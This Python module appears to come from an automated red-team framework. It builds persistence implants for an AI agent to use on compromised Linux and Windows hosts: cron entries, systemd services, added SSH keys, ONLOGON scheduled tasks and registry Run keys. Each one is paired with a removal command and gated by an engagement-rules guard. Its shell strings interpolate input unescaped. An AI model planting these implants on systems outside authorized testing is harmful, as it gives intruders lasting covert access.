"""AutoRed persistence tool wrappers — Phase 4, Task 6.

Five persistence methods live in this module:

  * Linux:
      - ``cron_modify``       — append an entry to the user's crontab.
      - ``systemd_create``    — drop a ``.service`` unit + enable/start it.
      - ``ssh_key_add``       — append a public key to ``authorized_keys``.
  * Windows:
      - ``schtasks_create``   — ``schtasks /create`` to install a scheduled task.
      - ``reg_modify``        — ``reg add`` to plant a Run-key autorun value.

Per the Phase 4 plan analysis, only three of the five have full ``@tool``
wrappers in this batch — ``cron_modify``, ``schtasks_create``,
``reg_modify``. The other two (``systemd_create``, ``ssh_key_add``) are
exposed only as ``_build_*`` / ``_removal_*`` helpers because their
execution surface is the foothold's shell (Phase 6 FootholdSessionManager),
not the operator. The helpers are exported now so Phase 6 can wire them
in without re-touching this module.

Critical contract (Review Focus #3): every persistence ``@tool`` wrapper
MUST return a ``PersistenceResult`` whose ``artifact`` is a non-null
``PersistenceArtifact`` carrying a non-empty ``removal_command`` —
that is the exact contract the Phase 5 Cleanup Agent walks when it
reverses every implant before the engagement closes.

Decorator order (Ruling 1): ``@tool`` OUTER, ``@roe_guard`` INNER — see
``autored.tools.hydra`` for the rationale and the regression tests in
``test_<tool>_ainvoke_works_with_roe_guard``.

Spec ref: §3.4 (post-ex models), §6.4 (persistence layer), §6.8 (RoE
guard), §9.2 (RoE categories).
"""
from __future__ import annotations

from langchain_core.tools import tool
from pydantic import BaseModel

from autored.logging import get_logger
from autored.models.postex import PersistenceArtifact
from autored.roe_guard import roe_guard
from autored.tools.nmap import _save_raw  # reuse from nmap

log = get_logger("tools.persistence")


class PersistenceResult(BaseModel):
    """Result of a persistence tool call.

    ``artifact`` is non-null on success and carries the
    ``removal_command`` the Phase 5 Cleanup Agent needs to reverse the
    implant. ``raw_output_path`` is set whenever the command was saved
    to ``engagements/<id>/raw/`` for the Phase 6 FootholdSessionManager
    to replay (Phase 4 stub — actual execution deferred).
    """

    method: str
    host_ip: str
    success: bool = False
    artifact: PersistenceArtifact | None = None
    raw_output_path: str = ""
    duration_sec: float = 0.0


# ---------------------------------------------------------------------------
# Removal commands — one per persistence method. The Cleanup Agent walks
# every ``PersistenceArtifact.removal_command`` verbatim, so these strings
# must round-trip through a POSIX/Windows shell as-is.
# ---------------------------------------------------------------------------


def _removal_cron(command: str) -> str:
    """Inverse of ``_build_cron_modify`` — grep every crontab entry that
    matches the persisted command out of the user's crontab."""
    return f"crontab -l | grep -v '{command}' | crontab -"


def _removal_schtasks(task_name: str) -> str:
    """``schtasks /delete /tn <name> /f`` — force-deletes the scheduled
    task (the ``/f`` suppresses the "are you sure?" prompt)."""
    return f"schtasks /delete /tn {task_name} /f"


def _removal_reg(key_path: str, value_name: str) -> str:
    """``reg delete <key> /v <name> /f`` — removes the value (and the key
    if it ends up empty, though ``reg delete`` does NOT recurse to the
    parent — the operator must clean up the parent manually if needed)."""
    return f"reg delete {key_path} /v {value_name} /f"


def _removal_systemd(service_name: str) -> str:
    """Stop, disable, and remove the unit file — the order matters;
    ``systemctl stop`` first so the service is not still running when
    the file is removed."""
    return (
        f"systemctl stop {service_name} && "
        f"systemctl disable {service_name} && "
        f"rm /etc/systemd/system/{service_name}.service"
    )


def _removal_ssh_key(comment: str) -> str:
    """``sed -i '/<comment>/d' ~/.ssh/authorized_keys`` — strips every
    authorized_keys entry that contains the comment marker. We embed the
    comment in the public key line (e.g. ``ssh-rsa AAAA... autored``) so
    the cleanup regex is comment-anchored, not key-anchored."""
    return f"sed -i '/{comment}/d' ~/.ssh/authorized_keys"


# ---------------------------------------------------------------------------
# Build helpers — one per persistence method. Each returns
# ``(cmd_argv_list, removal_command_string)``.
# ---------------------------------------------------------------------------


def _build_cron_modify(schedule: str, command: str) -> tuple[list[str], str]:
    """Build cron persistence command + removal.

    The cmd is a ``sh -c`` one-liner that reads the existing crontab,
    appends the new entry, and pipes the result back into ``crontab -``.
    """
    entry = f"{schedule} {command}"
    cmd = ["sh", "-c", f"(crontab -l; echo '{entry}') | crontab -"]
    removal = _removal_cron(command)
    return cmd, removal


def _build_systemd_create(
    service_name: str, command: str
) -> tuple[list[str], str]:
    """Build a systemd unit drop + enable + start.

    NOTE: helper-only in Phase 4 — not wrapped in a ``@tool`` (Phase 6
    will wire it into the FootholdSessionManager). The unit-file template
    is the canonical minimum for a long-running service: ``Restart=always``
    so a foothold reboot does not kill the implant, and
    ``WantedBy=multi-user.target`` so it starts at boot.
    """
    unit_file = (
        "[Unit]\n"
        "Description=AutoRed Persistence\n"
        "[Service]\n"
        f"ExecStart={command}\n"
        "Restart=always\n"
        "[Install]\n"
        "WantedBy=multi-user.target"
    )
    cmd = [
        "sh",
        "-c",
        f"echo '{unit_file}' > /etc/systemd/system/{service_name}.service "
        f"&& systemctl daemon-reload "
        f"&& systemctl enable {service_name}.service "
        f"&& systemctl start {service_name}.service",
    ]
    removal = _removal_systemd(service_name)
    return cmd, removal


def _build_ssh_key_add(
    public_key: str, comment: str = "autored"
) -> tuple[list[str], str]:
    """Append a public key to ``authorized_keys``.

    NOTE: helper-only in Phase 4 — not wrapped in a ``@tool`` (Phase 6
    will wire it into the FootholdSessionManager). The public key string
    is expected to end with the ``comment`` marker so the removal sed
    regex is comment-anchored.
    """
    cmd = [
        "sh",
        "-c",
        "mkdir -p ~/.ssh && "
        f"echo '{public_key}' >> ~/.ssh/authorized_keys && "
        "chmod 600 ~/.ssh/authorized_keys",
    ]
    removal = _removal_ssh_key(comment)
    return cmd, removal


def _build_schtasks_create(
    task_name: str, command: str, trigger: str = "ONLOGON"
) -> tuple[list[str], str]:
    """Build a ``schtasks /create`` argv list.

    ``/sc`` is the schedule trigger — ``ONLOGON`` (run when any user
    logs on) is the most reliable trigger for foothold persistence
    because it fires on every interactive logon, not just at a fixed
    wall-clock time. ``/f`` force-overwrites an existing task of the
    same name so re-runs are idempotent.
    """
    cmd = [
        "schtasks",
        "/create",
        "/tn",
        task_name,
        "/tr",
        command,
        "/sc",
        trigger,
        "/f",
    ]
    removal = _removal_schtasks(task_name)
    return cmd, removal


def _build_reg_modify(
    key_path: str, value_name: str, value_data: str
) -> tuple[list[str], str]:
    """Build a ``reg add`` argv list.

    ``/t REG_SZ`` is the only type we plant — string autoruns are the
    universal Run-key payload. ``/f`` force-overwrites an existing value
    of the same name so re-runs are idempotent.
    """
    cmd = [
        "reg",
        "add",
        key_path,
        "/v",
        value_name,
        "/t",
        "REG_SZ",
        "/d",
        value_data,
        "/f",
    ]
    removal = _removal_reg(key_path, value_name)
    return cmd, removal


# ---------------------------------------------------------------------------
# @tool wrappers — three of the five methods have full wrappers (per
# the Phase 4 plan analysis). Each:
#   1. Builds the command + removal via the matching _build_* helper.
#   2. Saves the command string via _save_raw so the Phase 6
#      FootholdSessionManager can replay it.
#   3. Builds a PersistenceArtifact with the removal_command — the
#      contract the Phase 5 Cleanup Agent walks.
#   4. Returns a PersistenceResult with success=True + the artifact.
# ---------------------------------------------------------------------------


@tool
@roe_guard(allowed_categories=["persistence"])
async def cron_modify(
    schedule: str,
    command: str,
    host_ip: str,
    foothold_id: str,
    engagement_id: str = "",
) -> PersistenceResult:
    """Establish cron persistence on a Linux foothold.

    The command is constructed for execution via the foothold's shell
    session. Actual execution requires the session manager (Phase 6).
    For now, this tool builds the command, saves it to
    ``engagements/<id>/raw/``, and returns a ``PersistenceArtifact``
    with the matching ``removal_command`` so the Phase 5 Cleanup Agent
    can reverse the implant.

    Args:
        schedule: Cron schedule expression (e.g., ``@reboot``,
            ``*/5 * * * *``).
        command: Shell command the cron entry will execute.
        host_ip: Target host IP (RoE guard scope check + recorded in
            the artifact).
        foothold_id: ID of the foothold establishing persistence
            (recorded in the artifact for traceability).
        engagement_id: Current engagement ID.

    Returns:
        ``PersistenceResult`` with ``artifact.method == "cron"`` and a
        non-empty ``removal_command`` (Review Focus #3 contract).
    """
    cmd, removal = _build_cron_modify(schedule, command)
    cmd_str = " ".join(cmd)
    log.info(
        "cron_modify",
        host_ip=host_ip,
        schedule=schedule,
        foothold_id=foothold_id,
    )
    raw_path = await _save_raw(
        "cron_persist_cmd", host_ip, cmd_str, "", engagement_id
    )
    artifact = PersistenceArtifact(
        host_ip=host_ip,
        method="cron",
        details={
            "schedule": schedule,
            "command": command,
            "command_built": cmd_str,
        },
        removal_command=removal,
        foothold_id=foothold_id,
    )
    return PersistenceResult(
        method="cron",
        host_ip=host_ip,
        success=True,
        artifact=artifact,
        raw_output_path=raw_path,
    )


@tool
@roe_guard(allowed_categories=["persistence"])
async def schtasks_create(
    task_name: str,
    command: str,
    trigger: str,
    host_ip: str,
    foothold_id: str,
    engagement_id: str = "",
) -> PersistenceResult:
    """Establish scheduled-task persistence on a Windows foothold.

    The command is constructed for execution via the foothold's shell
    session. Actual execution requires the session manager (Phase 6).
    For now, this tool builds the command, saves it to
    ``engagements/<id>/raw/``, and returns a ``PersistenceArtifact``
    with the matching ``removal_command`` so the Phase 5 Cleanup Agent
    can reverse the implant.

    Args:
        task_name: Scheduled task name (must be unique on the target).
        command: Command the task will execute.
        trigger: Schedule trigger type (e.g., ``ONLOGON``, ``ONSTART``,
            ``DAILY``).
        host_ip: Target host IP.
        foothold_id: ID of the foothold establishing persistence.
        engagement_id: Current engagement ID.

    Returns:
        ``PersistenceResult`` with ``artifact.method == "scheduled_task"``
        and a non-empty ``removal_command``.
    """
    cmd, removal = _build_schtasks_create(task_name, command, trigger)
    cmd_str = " ".join(cmd)
    log.info(
        "schtasks_create",
        host_ip=host_ip,
        task_name=task_name,
        trigger=trigger,
        foothold_id=foothold_id,
    )
    raw_path = await _save_raw(
        "schtasks_persist_cmd", host_ip, cmd_str, "", engagement_id
    )
    artifact = PersistenceArtifact(
        host_ip=host_ip,
        method="scheduled_task",
        details={
            "task_name": task_name,
            "command": command,
            "trigger": trigger,
            "command_built": cmd_str,
        },
        removal_command=removal,
        foothold_id=foothold_id,
    )
    return PersistenceResult(
        method="scheduled_task",
        host_ip=host_ip,
        success=True,
        artifact=artifact,
        raw_output_path=raw_path,
    )


@tool
@roe_guard(allowed_categories=["persistence"])
async def reg_modify(
    key_path: str,
    value_name: str,
    value_data: str,
    host_ip: str,
    foothold_id: str,
    engagement_id: str = "",
) -> PersistenceResult:
    """Establish registry Run-key persistence on a Windows foothold.

    The command is constructed for execution via the foothold's shell
    session. Actual execution requires the session manager (Phase 6).
    For now, this tool builds the command, saves it to
    ``engagements/<id>/raw/``, and returns a ``PersistenceArtifact``
    with the matching ``removal_command`` so the Phase 5 Cleanup Agent
    can reverse the implant.

    Args:
        key_path: Full registry key path (e.g.,
            ``HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run``).
        value_name: Value name to plant under that key.
        value_data: String value data — typically the command to run at
            logon.
        host_ip: Target host IP.
        foothold_id: ID of the foothold establishing persistence.
        engagement_id: Current engagement ID.

    Returns:
        ``PersistenceResult`` with ``artifact.method == "registry_run"``
        and a non-empty ``removal_command``.
    """
    cmd, removal = _build_reg_modify(key_path, value_name, value_data)
    cmd_str = " ".join(cmd)
    log.info(
        "reg_modify",
        host_ip=host_ip,
        key_path=key_path,
        value_name=value_name,
        foothold_id=foothold_id,
    )
    raw_path = await _save_raw(
        "reg_persist_cmd", host_ip, cmd_str, "", engagement_id
    )
    artifact = PersistenceArtifact(
        host_ip=host_ip,
        method="registry_run",
        details={
            "key_path": key_path,
            "value_name": value_name,
            "value_data": value_data,
            "command_built": cmd_str,
        },
        removal_command=removal,
        foothold_id=foothold_id,
    )
    return PersistenceResult(
        method="registry_run",
        host_ip=host_ip,
        success=True,
        artifact=artifact,
        raw_output_path=raw_path,
    )
